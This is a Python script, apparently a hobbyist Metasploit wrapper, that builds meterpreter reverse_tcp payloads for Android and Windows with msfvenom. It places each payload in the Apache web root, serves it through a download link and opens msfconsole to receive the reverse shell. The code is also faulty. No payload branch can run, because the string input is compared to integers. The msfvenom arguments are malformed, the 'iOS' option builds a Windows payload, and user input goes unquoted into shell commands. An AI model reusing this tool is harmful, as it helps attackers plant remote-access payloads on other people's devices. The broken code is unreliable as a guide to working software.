import subprocess, termcolor, time, sys
from termcolor import colored
import colorama
from colorama import Fore, Back, Style
time.sleep(1)
subprocess.run('clear', shell=True)
print(Style.BRIGHT + Fore.CYAN + """
,--.   ,--.        ,---.                      ,--.     
|   `.'   | ,---. /  .-',-----. ,--,--. ,---. |  |,-.  
|  |'.'|  |(  .-' |  `-,'-----'' ,-.  || .-. ||     /  
|  |   |  |.-'  `)|  .-'       \ '-'  || '-' '|  \  \  
`--'   `--'`----' `--'          `--`--'|  |-' `--'`--' 
                                       `--'            
""")
print(Fore.BLUE + "MSF-APK for android")
time.sleep(1)
print(Fore.CYAN + "[+]make your payload")
print(Style.BRIGHT + Fore.WHITE + "[+] NOTE! this is if you already have a connection with the phone and/or computer you want to reconnect to.")
msf = input(Style.BRIGHT + Fore.WHITE + "[+] do you want to start metasploit [y/n] ")
if msf == "y":
   print("----------------------------------------------------------")
   print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
   subprocess.run('msfconsole -q', shell=True)
   sys.exit()
else:
    print(Style.BRIGHT + Fore.BLUE + "ok moving on")
    time.sleep(1)

answer = input(Fore.YELLOW + "do you want to edit the apche2 ports.conf and apache2.conf file[y/n] ")
if answer == "y":
   print(Fore.YELLOW + "ok! editing file")
   time.sleep(1)
   subprocess.run('nano /etc/apache2/ports.conf', shell=True)
   subprocess.run('nano /etc/apache2/apache2.conf', shell=True)
   print(Style.BRIGHT + Fore.GREEN + "Saved!")
   time.sleep(1)
else:
    print(Style.BRIGHT + Fore.GREEN + "ok! saving file")

print(Fore.RED + """
[1] android/meterpreter/reverse_tcp
[2] windows/meterpreter/reverse_tcp
[3] apple_ios/armle/meterpreter_reverse_tcp
[99] exit
""")
payload = input(Fore.RED + "[+] payload: ")

if payload == 1:
   ip1 = str(input(Fore.RED + "[+] IP: "))
   port1 = str(input(Fore.RED + "[+] PORT: "))
   output_file1 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
   print(Fore.BLUE + "now wait..")
   subprocess.run('msfvenom -p android/meterpreter/reverse_tcp '+ip1+' '+port1+' -o /var/www/html/'+output_file1, shell=True)
   subprocess.run('service apache2 start', shell=True)
   print(Style.BRIGHT + Fore.GREEN + "apache2 is running!")
   print(Fore.RED + "----------------------------------------------------------")
   print(Fore.YELLOW + "original link: http://"+ip1+":2222/"+output_file1+"")
   print(Fore.RED + "----------------------------------------------------------")
   print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
   subprocess.run('msfconsole -q', shell=True)
   print(Fore.RED + "stoping apache2 webserver...")
   subprocess.run('service apache2 stop', shell=True)
   sys.exit()

elif payload == 2:
     ip2 = str(input(Fore.RED + "[+] IP: "))
     port2 = str(input(Fore.RED + "[+] PORT: "))
     output_file2 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
     print(Fore.BLUE + "now wait..")
     subprocess.run('msfvenom -p windows/meterpreter/reverse_tcp '+ip2+' '+port2+' -o /var/www/html/'+output_file2, shell=True)
     print(Fore.RED + "----------------------------------------------------------")
     print(Fore.YELLOW + "original link: http://"+ip2+":2222/"+output_file2+"")
     print(Fore.RED + "----------------------------------------------------------")
     print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
     subprocess.run('msfconsole -q', shell=True)
     print(Fore.RED + "stoping apache2 webserver...")
     subprocess.run('service apache2 stop', shell=True)

elif payload == 3:
     ip3 = str(input(Fore.RED + "[+] IP: "))
     port3 = str(input(Fore.RED + "[+] PORT: "))
     output_file3 = str(input(Fore.RED + "[+] OUTPUT FILE NAME: "))
     print(Fore.BLUE + "now wait..")
     subprocess.run('msfvenom -p windows/meterpreter/reverse_tcp '+ip3+' '+port3+' -o /var/www/html/'+output_file3, shell=True)
     print(Fore.RED + "----------------------------------------------------------")
     print(Fore.YELLOW + "original link: http://"+ip3+":2222/"+output_file3+"")
     print(Fore.RED + "----------------------------------------------------------")
     print(Style.BRIGHT + Fore.BLUE + "starting metasploit...")
     subprocess.run('msfconsole -q', shell=True)
     print(Fore.RED + "stoping apache2 webserver...")
     subprocess.run('service apache2 stop', shell=True)

else:
    print(Fore.BLUE + "[+] bye, Happy hacking😉")
    sys.exit()
